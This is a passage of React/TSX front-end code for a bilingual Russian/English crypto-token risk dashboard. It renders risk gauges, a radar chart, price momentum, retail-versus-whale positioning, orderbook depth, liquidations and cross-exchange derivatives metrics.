                          target="_blank"
                          rel="noopener noreferrer"
                          className="rounded-lg border border-primary/40 bg-primary/10 px-2.5 py-1 text-[11px] text-primary hover:underline"
                        >
                          📦 {result.github_repo} ↗
                        </a>
                        {result.audit_button_unlocked && (
                          <button
                            type="button"
                            onClick={() => {
                              window.dispatchEvent(
                                new CustomEvent("boris-quick-scan", { detail: { target: `https://github.com/${result.github_repo}` } })
                              );
                              document.getElementById("demo-scanner")?.scrollIntoView({ behavior: "smooth" });
                            }}
                            className="rounded-lg bg-primary px-2.5 py-1 text-[11px] font-bold text-primary-foreground hover:bg-primary-dim"
                          >
                            🔧 {isRu ? `Аудит кода ${result.github_repo.split("/").pop()}` : `Audit ${result.github_repo.split("/").pop()}`}
                          </button>
                        )}
                      </>
                    )}
                  </div>

                  <div className="flex items-center gap-2.5 text-xs">
                    <span className="text-muted-foreground text-[11px]">
                      {isRu ? "Полнота телеметрии:" : "Telemetry Completeness:"}
                    </span>
                    <div className="h-2.5 w-24 overflow-hidden rounded-full bg-background border border-border">
                      <div
                        className="h-full bg-primary transition-all duration-700"
                        style={{ width: `${conf}%` }}
                      />
                    </div>
                    <b className="text-foreground">{conf}%</b>
                    {onClose && (
                      <button
                        type="button"
                        onClick={onClose}
                        className="ml-2 rounded-lg border border-primary/40 bg-primary/15 px-2.5 py-1 text-[11px] font-bold text-primary hover:bg-primary hover:text-primary-foreground"
                      >
                        ✕ {isRu ? "Свернуть досье" : "Close Dossier"}
                      </button>
                    )}
                  </div>
                </div>

                {/* 3-Column Visual Telemetry Deck */}
                <div className="grid grid-cols-1 gap-4 lg:grid-cols-12">
                  {/* COL 1 (4 cols): Animated Radial Risk Speedometer + Conclusion */}
                  <div className="rounded-xl border border-border bg-background/70 p-4 lg:col-span-4 flex flex-col justify-between">
                    <div className="flex items-center justify-between mb-1">
                      <span className="text-[10px] uppercase tracking-wider text-primary font-bold">
                        🎯 {isRu ? "Сводный радар риска и режима" : "Composite Risk Speedometer"}
                      </span>
                      <span className="text-[10px] text-muted-foreground">0–100 Scale</span>
                    </div>

                    <div className="flex items-center gap-4 my-2">
                      <div className="relative h-32 w-32 shrink-0 flex items-center justify-center">
                        <svg viewBox="0 0 130 130" className="h-full w-full rotate-[135deg]">
                          {/* Background track (270 deg) */}
                          <circle
                            cx="65"
                            cy="65"
                            r={rad}
                            fill="transparent"
                            stroke="hsl(var(--border))"
                            strokeWidth="10"
                            strokeDasharray={`${arcLen} ${circum}`}
                            strokeLinecap="round"
                          />
                          {/* Animated Foreground Arc */}
                          <circle
                            cx="65"
                            cy="65"
                            r={rad}
                            fill="transparent"
                            stroke={accentStroke}
                            strokeWidth="10"
                            strokeDasharray={`${arcLen} ${circum}`}
                            strokeDashoffset={arcOffset}
                            strokeLinecap="round"
                            className="transition-all duration-1000 ease-out"
                          />
                        </svg>
                        <div className="absolute inset-0 flex flex-col items-center justify-center text-center">
                          <span className="text-2xl font-black text-foreground leading-none">{score}</span>
                          <span className="text-[9px] uppercase tracking-wider text-muted-foreground mt-1">
                            {result.level || "LOW"}
                          </span>
                        </div>
                      </div>

                      <div className="space-y-2 text-xs min-w-0 flex-1">
                        <div className="rounded-lg border border-border bg-card p-2.5">
                          <p className="text-[9px] uppercase text-muted-foreground">
                            {isRu ? "Вердикт аналитика" : "Analyst Verdict"}
                          </p>
                          <p className="mt-1 text-[11px] font-bold text-foreground leading-snug">
                            {result.conclusion ||
                              (isRu
                                ? "Умеренный риск: наблюдается расхождение позиций толпы и крупных игроков."
                                : "Moderate risk profile: divergence detected between retail crowd and top traders.")}
                          </p>
                        </div>
                        <div className="flex items-center justify-between text-[11px] px-1">
                          <span className="text-muted-foreground">{isRu ? "Органика потока:" : "Organic Flow:"}</span>
                          <b className="text-emerald-400">{organic}%</b>
                        </div>
                      </div>
                    </div>

                    <div className="grid grid-cols-2 gap-2 pt-2 border-t border-border/60 text-[10px]">
                      <div className="rounded bg-card px-2.5 py-1.5 flex items-center justify-between">
                        <span className="text-muted-foreground">{isRu ? "Сигналов:" : "Signals:"}</span>
                        <b className="text-primary">{result.signals_total ?? (result.signals?.length || 0)}</b>
                      </div>
                      <div className="rounded bg-card px-2.5 py-1.5 flex items-center justify-between">
                        <span className="text-muted-foreground">{isRu ? "Источников:" : "Sources:"}</span>
                        <b className="text-foreground">{result.snapshot?.data_sources?.length || 4} CEX/DEX</b>
                      </div>
                    </div>
                  </div>

                  {/* COL 2 (4 cols): 4-Axis SVG Spider / Radar Polygon + 4 Risk Gauges */}
                  <div className="rounded-xl border border-border bg-background/70 p-4 lg:col-span-4 flex flex-col justify-between">
                    <div className="flex items-center justify-between mb-1">
                      <span className="text-[10px] uppercase tracking-wider text-primary font-bold">
                        🕸️ {isRu ? "4-осевая роза рисков (Spider Graph)" : "4-Axis Risk & Organic Topology"}
                      </span>
                      <span className="text-[10px] text-muted-foreground">Live Vector</span>
                    </div>

                    <div className="flex flex-col sm:flex-row items-center gap-3 my-1">
                      {/* SVG Radar Chart */}
                      <div className="relative h-36 w-36 shrink-0">
                        <svg viewBox="0 0 180 180" className="h-full w-full">
                          {/* Concentric diamond rings */}
                          {[20, 40, 60].map((rStep) => (
                            <polygon
                              key={rStep}
                              points={`${cx},${cy - rStep} ${cx + rStep},${cy} ${cx},${cy + rStep} ${cx - rStep},${cy}`}
                              fill="none"
                              stroke="hsl(var(--border))"
                              strokeWidth="1"
                              strokeDasharray={rStep === 60 ? "none" : "2 2"}
                            />
                          ))}
                          {/* Cross axes */}
                          <line x1={cx} y1={cy - 62} x2={cx} y2={cy + 62} stroke="hsl(var(--border))" strokeWidth="1" />
                          <line x1={cx - 62} y1={cy} x2={cx + 62} y2={cy} stroke="hsl(var(--border))" strokeWidth="1" />
                          {/* Data polygon */}
                          <polygon
                            points={radarPoints}
                            fill="rgba(239, 68, 68, 0.22)"
                            stroke="#ef4444"
                            strokeWidth="2"
                            className="transition-all duration-700"
                          />
                          {/* Axis vertices */}
                          <circle cx={cx} cy={cy - (manip / 100) * rMax} r="3.5" fill="#ef4444" />
                          <circle cx={cx + (crowd / 100) * rMax} cy={cy} r="3.5" fill="#f59e0b" />
                          <circle cx={cx} cy={cy + (fundWeak / 100) * rMax} r="3.5" fill="#a855f7" />
                          <circle cx={cx - (organic / 100) * rMax} cy={cy} r="3.5" fill="#10b981" />
                          {/* Axis Labels */}
                          <text x={cx} y="16" textAnchor="middle" fill="#f87171" fontSize="9" fontWeight="bold">
                            MANIP {manip}
                          </text>
                          <text x="174" y={cy + 3} textAnchor="end" fill="#fbbf24" fontSize="8" fontWeight="bold">
                            CROWD {crowd}
                          </text>
                          <text x={cx} y="172" textAnchor="middle" fill="#c084fc" fontSize="9" fontWeight="bold">
                            FUND {fundWeak}
                          </text>
                          <text x="6" y={cy + 3} textAnchor="start" fill="#34d399" fontSize="8" fontWeight="bold">
                            ORG {organic}%
                          </text>
                        </svg>
                      </div>

                      {/* 4 Annotated Progress Bars */}
                      <div className="w-full space-y-2 text-[11px]">
                        {[
                          {
                            label: isRu ? "🎭 Манипуляции" : "🎭 Manipulation",
                            sub: isRu ? "Спуфинг / пампы / аномалии" : "Spoofing / pump anomalies",
                            val: manip,
                            bar: manip >= 50 ? "bg-destructive" : "bg-red-500/80",
                          },
                          {
                            label: isRu ? "👥 Перегрев толпы" : "👥 Crowd Tilt",
                            sub: isRu ? "Перекос ретейла в одну сторону" : "Retail one-sided crowding",
                            val: crowd,
                            bar: "bg-amber-500",
                          },
                          {
                            label: isRu ? "🧱 Слабость базы" : "🧱 Fund. Weakness",
                            sub: isRu ? "Токеномика / низкая ликвидность" : "Supply & liquidity fragility",
                            val: fundWeak,
                            bar: "bg-purple-500",
                          },
                          {
                            label: isRu ? "🌱 Органика рынка" : "🌱 Organic Prob.",
                            sub: isRu ? "Доля живого реального спроса" : "Genuine organic demand share",
                            val: organic,
                            bar: "bg-emerald-500",
                          },
                        ].map((b, bi) => (
                          <div key={bi} className="space-y-1">
                            <div className="flex items-center justify-between">
                              <span className="font-semibold text-foreground" title={b.sub}>
                                {b.label}
                              </span>
                              <b className="text-foreground">{b.val}/100</b>
                            </div>
                            <div className="h-1.5 w-full overflow-hidden rounded-full bg-card border border-border/60">
                              <div className={`h-full ${b.bar} transition-all duration-700`} style={{ width: `${b.val}%` }} />
                            </div>
                          </div>
                        ))}
                      </div>
                    </div>
                  </div>

                  {/* COL 3 (4 cols): Spot Price Telemetry & 30d->7d->24h SVG Momentum Curve */}
                  <div className="rounded-xl border border-border bg-background/70 p-4 lg:col-span-4 flex flex-col justify-between">
                    <div className="flex items-center justify-between">
                      <div>
                        <span className="text-[10px] uppercase tracking-wider text-primary font-bold">
                          💹 {isRu ? "Спот-телеметрия и импульс цены" : "Spot Telemetry & Price Momentum"}
                        </span>
                        <p className="text-2xl font-black text-foreground mt-0.5">
                          {result.snapshot?.price_usd !== null && result.snapshot?.price_usd !== undefined
                            ? `$${
                                Number(result.snapshot.price_usd) < 1
                                  ? Number(result.snapshot.price_usd).toFixed(5)
                                  : Number(result.snapshot.price_usd).toLocaleString(undefined, { maximumFractionDigits: 2 })
                              }`
                            : "—"}
                        </p>
                      </div>
                      <div className="text-right">
                        <span
                          className={`inline-block rounded-lg border px-2.5 py-1 text-xs font-bold ${
                            ch24 >= 0
                              ? "border-emerald-500/40 bg-emerald-500/15 text-emerald-400"
                              : "border-destructive/40 bg-destructive/15 text-destructive"
                          }`}
                        >
                          24h: {ch24 >= 0 ? "+" : ""}
                          {ch24.toFixed(2)}%
                        </span>
                        {result.snapshot?.listing_age_days && (
                          <p className="text-[10px] text-muted-foreground mt-1">
                            ⏳ {isRu ? "Возраст:" : "Age:"} <b className="text-foreground">{result.snapshot.listing_age_days}d</b>
                          </p>
                        )}
                      </div>
                    </div>

                    {/* SVG Momentum Trajectory (30d -> 7d -> 24h -> Now) */}
                    <div className="my-2 rounded-lg border border-border/70 bg-card/80 p-2">
                      <div className="flex items-center justify-between text-[9px] text-muted-foreground px-1 mb-1">
                        <span>30D ({ch30 >= 0 ? "+" : ""}{ch30.toFixed(1)}%)</span>
                        <span>7D ({ch7 >= 0 ? "+" : ""}{ch7.toFixed(1)}%)</span>
                        <span>24H ({ch24 >= 0 ? "+" : ""}{ch24.toFixed(1)}%)</span>
                        <span className="text-primary font-bold">NOW</span>
                      </div>
                      <svg viewBox="0 0 260 66" className="h-14 w-full overflow-visible">
                        <defs>
                          <linearGradient id={`grad-${result.symbol}`} x1="0" y1="0" x2="0" y2="1">
                            <stop offset="0%" stopColor={curveColor} stopOpacity="0.35" />
                            <stop offset="100%" stopColor={curveColor} stopOpacity="0.0" />
                          </linearGradient>
                        </defs>
                        <path d={areaPath} fill={`url(#grad-${result.symbol})`} />
                        <path d={curvePath} fill="none" stroke={curveColor} strokeWidth="2.5" strokeLinecap="round" />
                        {[
                          { x: 16, y: y0 },
                          { x: 95, y: y1 },
                          { x: 168, y: y2 },
                          { x: 244, y: y3 },
                        ].map((pt, pi) => (
                          <circle
                            key={pi}
                            cx={pt.x}
                            cy={pt.y}
                            r={pi === 3 ? "4.5" : "3"}
                            fill={pi === 3 ? curveColor : "#090d16"}
                            stroke={curveColor}
                            strokeWidth="2"
                          />
                        ))}
                      </svg>
                    </div>

                    {/* Spot Key Metrics Grid */}
                    <div className="grid grid-cols-3 gap-2 text-[11px]">
                      <div className="rounded-lg border border-border bg-card p-2">
                        <p className="text-[9px] uppercase text-muted-foreground">Market Cap</p>
                        <p className="font-bold text-foreground mt-0.5">
                          {result.snapshot?.market_cap ? `$${fmt(result.snapshot.market_cap)}` : "—"}
                        </p>
                      </div>
                      <div className="rounded-lg border border-border bg-card p-2">
                        <p className="text-[9px] uppercase text-muted-foreground">Volume 24h</p>
                        <p className="font-bold text-foreground mt-0.5">
                          {result.snapshot?.volume_24h ? `$${fmt(result.snapshot.volume_24h)}` : "—"}
                        </p>
                      </div>
                      <div className="rounded-lg border border-border bg-card p-2">
                        <p className="text-[9px] uppercase text-muted-foreground">Δ 7D / 30D</p>
                        <p className="font-bold mt-0.5">
                          <span className={ch7 >= 0 ? "text-emerald-400" : "text-destructive"}>
                            {ch7 >= 0 ? "+" : ""}
                            {ch7.toFixed(1)}%
                          </span>
                          {" / "}
                          <span className={ch30 >= 0 ? "text-emerald-400" : "text-destructive"}>
                            {ch30 >= 0 ? "+" : ""}
                            {ch30.toFixed(1)}%
                          </span>
                        </p>
                      </div>
                    </div>
                  </div>
                </div>

                {/* ══════════════════════════════════════════════════════════════════
                    SECTION 2: POSITIONING ARENA (RETAIL VS WHALES TUG-OF-WAR + ORDERBOOK & LIQUIDATIONS)
                    ══════════════════════════════════════════════════════════════════ */}
                {result.deep_unlocked && (
                  <div className="grid grid-cols-1 gap-4 lg:grid-cols-12 pt-1">
                    {/* LEFT (6 cols): Retail Crowd vs Smart Money (Top Traders) Tug-of-War */}
                    <div className="rounded-xl border border-border bg-background/70 p-4 lg:col-span-6 space-y-3.5">
                      <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border/60 pb-2.5">
                        <div>
                          <p className="text-[10px] uppercase tracking-wider text-primary font-bold">
                            ⚔️ {isRu ? "Позиционирование: Толпа (Retail) против Китов (Top Traders)" : "Positioning Arena: Retail Crowd vs Smart Money"}
                          </p>
                          <p className="text-[10px] text-muted-foreground mt-0.5">
                            {isRu
                              ? "Сравнение доли лонгов среди всех розничных аккаунтов и среди крупнейших портфелей"
                              : "Comparing Long/Short skew between all retail accounts and top whale accounts"}
                          </p>
                        </div>
                        {topDelta !== null && (
                          <span
                            className={`rounded-lg border px-2.5 py-1 text-[11px] font-bold ${
                              topDelta <= -10
                                ? "border-red-500/50 bg-red-500/15 text-red-300"
                                : topDelta >= 10
                                ? "border-emerald-500/50 bg-emerald-500/15 text-emerald-300"
                                : "border-border bg-card text-foreground"
                            }`}
                          >
                            Smart Money Δ: {topDelta > 0 ? `+${topDelta}%` : `${topDelta}%`}
                          </span>
                        )}
                      </div>

                      {/* Bar 1: Retail Crowd Accounts */}
                      <div className="space-y-1.5">
                        <div className="flex items-center justify-between text-xs">
                          <span className="font-bold text-foreground flex items-center gap-1.5">
                            👥 {isRu ? "Розничная толпа (Все аккаунты):" : "Retail Crowd (All Accounts):"}
                          </span>
                          <span>
                            <b className="text-emerald-400">
                              {retailLong !== null ? `LONG ${retailLong.toFixed(0)}%` : "—"}
                            </b>
                            {" vs "}
                            <b className="text-destructive">
                              {retailLong !== null ? `SHORT ${(100 - retailLong).toFixed(0)}%` : "—"}
                            </b>
                          </span>
                        </div>
                        <div className="relative h-3.5 w-full overflow-hidden rounded-full bg-destructive/45 flex border border-border/60">
                          <div
                            className="h-full bg-gradient-to-r from-emerald-600 to-emerald-400 transition-all duration-700"
                            style={{ width: `${retailLong ?? 50}%` }}
                          />
                          <div className="absolute left-1/2 top-0 bottom-0 w-0.5 bg-white/60" title="50% Neutral" />
                        </div>
                      </div>

                      {/* Bar 2: Top Traders (Smart Money Whales) */}
                      <div className="space-y-1.5">
                        <div className="flex items-center justify-between text-xs">
                          <span className="font-bold text-foreground flex items-center gap-1.5">
                            🐋 {isRu ? "Умные деньги (Топ-трейдеры по капиталу):" : "Smart Money (Top Whale Positions):"}
                          </span>
                          <span>
                            <b className="text-emerald-400">
                              {topLong !== null ? `LONG ${topLong.toFixed(0)}%` : "—"}
                            </b>
                            {" vs "}
                            <b className="text-destructive">
                              {topLong !== null ? `SHORT ${(100 - topLong).toFixed(0)}%` : "—"}
                            </b>
                          </span>
                        </div>
                        <div className="relative h-3.5 w-full overflow-hidden rounded-full bg-destructive/45 flex border border-border/60">
                          <div
                            className="h-full bg-gradient-to-r from-cyan-500 to-emerald-400 transition-all duration-700"
                            style={{ width: `${topLong ?? 50}%` }}
                          />
                          <div className="absolute left-1/2 top-0 bottom-0 w-0.5 bg-white/60" title="50% Neutral" />
                        </div>
                      </div>

                      {/* Visual Explanation of Divergence */}
                      {topDelta !== null && Math.abs(topDelta) >= 8 && (
                        <div
                          className={`rounded-lg border p-2.5 text-[11px] leading-relaxed ${
                            topDelta < 0
                              ? "border-amber-500/40 bg-amber-500/10 text-amber-200"
                              : "border-emerald-500/40 bg-emerald-500/10 text-emerald-200"
                          }`}
                        >
                          {topDelta < 0 ? (
                            <span>
                              ⚠️ <b>{isRu ? "Медвежья дивергенция (Риск сквиза лонгов):" : "Bearish Smart-Money Divergence:"}</b>{" "}
                              {isRu
                                ? `Розничная толпа экстремально забилась в лонг (${retailLong?.toFixed(0)}%), тогда как доля лонгов у крупных игроков на ${Math.abs(topDelta)}% ниже (${topLong?.toFixed(0)}%). Крупный капитал хеджируется или набирает шорт об толпу.`
                                : `Retail accounts are heavily crowded Long (${retailLong?.toFixed(0)}%), while top traders hold ${Math.abs(topDelta)}% less Long exposure (${topLong?.toFixed(0)}%). Elevated long-squeeze risk.`}
                            </span>
                          ) : (
                            <span>
                              🟢 <b>{isRu ? "Бычья дивергенция (Накопление китами):" : "Bullish Smart-Money Divergence:"}</b>{" "}
                              {isRu
                                ? `Топ-трейдеры держат на +${topDelta}% больше лонгов (${topLong?.toFixed(0)}%), чем розничная толпа (${retailLong?.toFixed(0)}%).`
                                : `Top traders hold +${topDelta}% higher Long positioning (${topLong?.toFixed(0)}%) than retail accounts (${retailLong?.toFixed(0)}%).`}
                            </span>
                          )}
                        </div>
                      )}

                      {/* L/S Ratios Footer */}
                      <div className="grid grid-cols-3 gap-2 pt-1 text-[11px]">
                        <div className="rounded-lg border border-border bg-card p-2">
                          <p className="text-[9px] uppercase text-muted-foreground">Binance L/S Ratio</p>
                          <p className="font-bold text-foreground mt-0.5">{fmt(result.snapshot?.long_short_ratio)}</p>
                        </div>
                        <div className="rounded-lg border border-border bg-card p-2">
                          <p className="text-[9px] uppercase text-muted-foreground">OKX L/S Ratio</p>
                          <p className="font-bold text-foreground mt-0.5">
                            {result.snapshot?.long_short_okx ? fmt(result.snapshot.long_short_okx) : "—"}
                          </p>
                        </div>
                        <div className="rounded-lg border border-border bg-card p-2">
                          <p className="text-[9px] uppercase text-muted-foreground">Bybit Long %</p>
                          <p className="font-bold text-foreground mt-0.5">
                            {result.snapshot?.long_short_bybit !== null && result.snapshot?.long_short_bybit !== undefined
                              ? `${Number(result.snapshot.long_short_bybit).toFixed(0)}% Long`
                              : "—"}
                          </p>
                        </div>
                      </div>
                    </div>

                    {/* RIGHT (6 cols): Taker Aggression + Orderbook Depth ±2% + Liquidations */}
                    <div className="rounded-xl border border-border bg-background/70 p-4 lg:col-span-6 space-y-3.5 flex flex-col justify-between">
                      <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border/60 pb-2.5">
                        <div>
                          <p className="text-[10px] uppercase tracking-wider text-primary font-bold">
                            🌊 {isRu ? "Поток рыночных ордеров (Taker Flow) и Стакан ±2%" : "Taker Orderflow, Orderbook Depth ±2% & Liquidations"}
                          </p>
                          <p className="text-[10px] text-muted-foreground mt-0.5">
                            {isRu
                              ? "Кто бьёт по рынку прямо сейчас (покупатели vs продавцы) и плотность лимитных стенок"
                              : "Real-time market order aggression and limit orderbook wall density within ±2%"}
                          </p>
                        </div>
                        {takerBuyPct !== null && (
                          <span
                            className={`rounded-lg border px-2.5 py-1 text-[11px] font-bold ${
                              takerBuyPct >= 51.5
                                ? "border-emerald-500/40 bg-emerald-500/15 text-emerald-300"
                                : takerBuyPct <= 48.5
                                ? "border-red-500/40 bg-red-500/15 text-red-300"
                                : "border-border bg-card text-muted-foreground"
                            }`}
                          >
                            {takerBuyPct >= 51.5
                              ? isRu ? "🟢 Доминация покупателей" : "🟢 Taker Buy Dominance"
                              : takerBuyPct <= 48.5
                              ? isRu ? "🔴 Доминация продавцов" : "🔴 Taker Sell Dominance"
                              : isRu ? "⚖️ Баланс потока" : "⚖️ Balanced Flow"}
                          </span>
                        )}
                      </div>

                      {/* 1. Taker Buy vs Sell Aggression Bar */}
                      {takerBuyPct !== null && (
                        <div className="space-y-1.5">
                          <div className="flex justify-between text-xs">
                            <span className="text-emerald-400 font-bold">
                              🟢 Taker Buy (Покупки по рынку): {takerBuyPct.toFixed(1)}%
                            </span>
                            <span className="text-destructive font-bold">
                              Sell (Продажи): {(100 - takerBuyPct).toFixed(1)}% 🔴
                            </span>
                          </div>
                          <div className="relative h-4 w-full overflow-hidden rounded-full bg-destructive/50 flex border border-border/60">
                            <div
                              className="h-full bg-gradient-to-r from-emerald-600 to-emerald-400 transition-all duration-700"
                              style={{ width: `${takerBuyPct}%` }}
                            />
                            <div className="absolute left-1/2 top-0 bottom-0 w-0.5 bg-white/70" />
                          </div>
                        </div>
                      )}

                      {/* 2. Orderbook Depth ±2% (Bids vs Asks) */}
                      <div className="space-y-1.5 pt-1">
                        <div className="flex items-center justify-between text-xs">
                          <span className="text-emerald-400 font-bold">
                            📗 Bids -2% (Стенки покупок): {bid2 > 0 ? `$${fmt(bid2)}` : "—"}
                          </span>
                          <span className="text-[11px] text-muted-foreground">
                            Σ Depth ±2%: <b className="text-foreground">{depthTot > 0 ? `$${fmt(depthTot)}` : "—"}</b>
                            {result.snapshot?.depth_imbalance !== null && result.snapshot?.depth_imbalance !== undefined
                              ? ` (Imb: ${Number(result.snapshot.depth_imbalance) >= 0 ? "+" : ""}${Number(result.snapshot.depth_imbalance).toFixed(2)})`
                              : ""}
                          </span>
                          <span className="text-destructive font-bold">
                            Asks +2% (Продажи): {ask2 > 0 ? `$${fmt(ask2)}` : "—"} 📕
                          </span>
                        </div>
                        <div className="relative h-3 w-full overflow-hidden rounded-full bg-destructive/40 flex border border-border/60">
                          <div
                            className="h-full bg-emerald-500/85 transition-all duration-700"
                            style={{ width: `${bidShare}%` }}
                          />
                          <div className="absolute left-1/2 top-0 bottom-0 w-0.5 bg-white/60" />
                        </div>
                      </div>

                      {/* 3. Liquidations & Orderflow Telemetry Strip */}
                      <div className="grid grid-cols-3 gap-2 pt-1 text-[11px]">
                        <div className="rounded-lg border border-border bg-card p-2">
                          <p className="text-[9px] uppercase text-muted-foreground">
                            {isRu ? "Ликвидации 1ч" : "Liquidations 1h"}
                          </p>
                          <p className="font-bold text-foreground mt-0.5">
                            {result.snapshot?.liquidation_1h ? `$${fmt(result.snapshot.liquidation_1h)}` : "$0"}
                          </p>
                        </div>
                        <div className="rounded-lg border border-border bg-card p-2">
                          <p className="text-[9px] uppercase text-muted-foreground">
                            {isRu ? "Ликвидации 24ч" : "Liquidations 24h"}
                          </p>
                          <p className="font-bold text-foreground mt-0.5">
                            {result.snapshot?.liq_total_24h ? `$${fmt(result.snapshot.liq_total_24h)}` : "$0"}
                          </p>
                        </div>
                        <div className="rounded-lg border border-border bg-card p-2">
                          <p className="text-[9px] uppercase text-muted-foreground">
                            {isRu ? "Скорость OI (Velocity)" : "OI Velocity"}
                          </p>
                          <p className="font-bold text-primary mt-0.5">
                            {result.snapshot?.oi_velocity !== null && result.snapshot?.oi_velocity !== undefined
                              ? `${result.snapshot.oi_velocity}x vs base`
                              : "1.0x"}
                          </p>
                        </div>
                      </div>
                    </div>
                  </div>
                )}

                {/* ══════════════════════════════════════════════════════════════════
                    SECTION 3: MULTI-EXCHANGE MATRIX (BINANCE · OKX · BYBIT) & DERIVATIVES PULSE
                    ══════════════════════════════════════════════════════════════════ */}
                <div className="grid grid-cols-1 gap-4 lg:grid-cols-12 pt-1">
                  {/* LEFT (7 cols): Visual Cross-Exchange OI & Funding Comparison Bars */}
                  <div className="rounded-xl border border-border bg-background/70 p-4 lg:col-span-7 space-y-3.5">
                    <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border/60 pb-2.5">
                      <div>
                        <p className="text-[10px] uppercase tracking-wider text-primary font-bold">
                          🏦 {isRu ? "Кросс-биржевая матрица деривативов (Binance · OKX · Bybit)" : "Multi-Exchange Derivatives Matrix (Binance · OKX · Bybit)"}
                        </p>
                        <p className="text-[10px] text-muted-foreground mt-0.5">
                          {isRu
                            ? "Распределение открытого интереса (Open Interest $) и ставок фондирования (Funding Rate) по топ-3 биржам"
                            : "Open Interest ($ USD) distribution and perpetual Funding Rates across top 3 CEX venues"}
                        </p>
                      </div>
                      <span className="rounded-lg border border-primary/40 bg-primary/10 px-2.5 py-1 text-xs font-bold text-primary">
                        Σ Total OI: {oiTotalMulti > 0 ? `$${fmt(oiTotalMulti)}` : result.snapshot?.oi_usdt ? `$${fmt(result.snapshot.oi_usdt)}` : "—"}
                      </span>
                    </div>

                    {result.cross_exchange_unlocked ? (
                      <div className="space-y-3">
                        {[
                          {
                            name: "🟡 Binance Futures",
                            oi: oiBn,
                            fund: result.snapshot?.funding_binance ?? result.snapshot?.funding_rate,
                            ls: result.snapshot?.long_short_ratio ? `L/S ${fmt(result.snapshot.long_short_ratio)}` : null,
                            barColor: "bg-amber-400",
                          },
                          {
                            name: "⚪ OKX Swap",
                            oi: oiOkx,
                            fund: result.snapshot?.funding_okx,
                            ls: result.snapshot?.long_short_okx ? `L/S ${fmt(result.snapshot.long_short_okx)}` : null,
                            barColor: "bg-cyan-400",
                          },
                          {
                            name: "🟠 Bybit Linear",
                            oi: oiBb,
                            fund: result.snapshot?.funding_bybit,
                            ls:
                              result.snapshot?.long_short_bybit !== null && result.snapshot?.long_short_bybit !== undefined
                                ? `${Number(result.snapshot.long_short_bybit).toFixed(0)}% Long`
                                : null,
                            barColor: "bg-orange-400",
                          },
                        ].map((ex, ei) => {
                          const sharePct = oiTotalMulti > 0 ? ((ex.oi / oiTotalMulti) * 100).toFixed(1) : "0.0";
                          const barW = oiMaxEx > 0 ? Math.max(4, (ex.oi / oiMaxEx) * 100) : 4;
                          const fVal = ex.fund !== null && ex.fund !== undefined ? Number(ex.fund) : null;
                          return (
                            <div key={ei} className="rounded-lg border border-border bg-card p-3 space-y-2">
                              <div className="flex flex-wrap items-center justify-between gap-2 text-xs">
                                <div className="flex items-center gap-2">
                                  <span className="font-bold text-foreground">{ex.name}</span>
                                  <span className="text-[10px] text-muted-foreground">({sharePct}% of OI)</span>
                                </div>
                                <div className="flex items-center gap-2 text-[11px]">
                                  <span className="font-bold text-foreground">
                                    OI: {ex.oi > 0 ? `$${fmt(ex.oi)}` : "—"}
                                  </span>
                                  {fVal !== null && (
                                    <span
                                      className={`rounded border px-2 py-0.5 text-[10px] font-bold ${
                                        fVal > 0.0001
                                          ? "border-emerald-500/40 bg-emerald-500/15 text-emerald-300"
                                          : fVal < -0.00001
                                          ? "border-red-500/40 bg-red-500/15 text-red-300"
                                          : "border-border bg-background text-muted-foreground"
                                      }`}
                                    >
                                      Funding: {fVal >= 0 ? "+" : ""}
                                      {fVal.toFixed(6)}
                                    </span>
                                  )}
                                  {ex.ls && (
                                    <span className="rounded border border-border bg-background px-2 py-0.5 text-[10px] text-primary font-semibold">
                                      {ex.ls}
                                    </span>
                                  )}
                                </div>
                              </div>
                              <div className="h-2 w-full overflow-hidden rounded-full bg-background border border-border/50">
                                <div className={`h-full ${ex.barColor} transition-all duration-700`} style={{ width: `${barW}%` }} />
                              </div>
                            </div>
                          );
                        })}
                      </div>
                    ) : (
                      <div className="rounded-lg border border-primary/30 bg-primary/5 p-3 text-xs text-muted-foreground">
                        🔒 {isRu
                          ? "Кросс-биржевая матрица OI и фандинга (Binance · OKX · Bybit) открывается на тарифе BLACKBOX."
                          : "Cross-Exchange OI & Funding Matrix (Binance · OKX · Bybit) requires BLACKBOX tier."}
                      </div>
                    )}

                    {/* Derivatives Metrics Strip (6 boxes) */}
                    <div className="grid grid-cols-2 gap-2 sm:grid-cols-3 lg:grid-cols-6 pt-1 text-[11px]">
                      {[
                        {
                          k: "OI Δ 24h",
                          v:
                            result.snapshot?.oi_change_24h_pct !== null && result.snapshot?.oi_change_24h_pct !== undefined
                              ? `${Number(result.snapshot.oi_change_24h_pct) >= 0 ? "+" : ""}${Number(result.snapshot.oi_change_24h_pct).toFixed(1)}%`
                              : "—",
                        },
                        {
                          k: "OI Δ 7d",
                          v:
                            result.snapshot?.oi_change_7d_pct !== null && result.snapshot?.oi_change_7d_pct !== undefined
                              ? `${Number(result.snapshot.oi_change_7d_pct) >= 0 ? "+" : ""}${Number(result.snapshot.oi_change_7d_pct).toFixed(1)}%`
                              : "—",
                        },
                        {
                          k: "OI / Vol 24h",
                          v:
                            result.snapshot?.oi_vol_ratio !== null && result.snapshot?.oi_vol_ratio !== undefined
                              ? `${result.snapshot.oi_vol_ratio}x`
                              : "—",
                        },
                        {
                          k: "Funding Trend",
                          v: result.snapshot?.funding_trend || "neutral",
                        },
                        {
                          k: "Funding 7d Avg",
                          v:
                            result.snapshot?.funding_avg_7d !== null && result.snapshot?.funding_avg_7d !== undefined
                              ? Number(result.snapshot.funding_avg_7d).toFixed(6)
                              : "—",
                        },
                        {
                          k: "Exchange Div.",
                          v:
                            result.snapshot?.oi_exchange_divergence !== null && result.snapshot?.oi_exchange_divergence !== undefined
                              ? Number(result.snapshot.oi_exchange_divergence).toFixed(2)
                              : "0.00",
                        },
                      ].map((dm, dmi) => (
                        <div key={dmi} className="rounded-lg border border-border bg-card p-2">
                          <p className="text-[9px] uppercase text-muted-foreground">{dm.k}</p>
                          <p className="font-bold text-foreground mt-0.5 truncate">{dm.v}</p>
                        </div>
                      ))}
                    </div>
                  </div>

                  {/* RIGHT (5 cols): Temporal ETM Trajectory + Supply Circulation & Score Waterfall */}
                  <div className="rounded-xl border border-border bg-background/70 p-4 lg:col-span-5 flex flex-col justify-between space-y-3.5">
                    {/* 1. Temporal ETM Block */}
                    <div className="space-y-2">
                      <div className="flex items-center justify-between border-b border-border/60 pb-2">
                        <span className="text-[10px] uppercase tracking-wider text-primary font-bold">
                          ⏱️ {isRu ? "Темпоральная динамика (ETM & Режим)" : "Temporal Trajectory & ETM Forecast"}
                        </span>
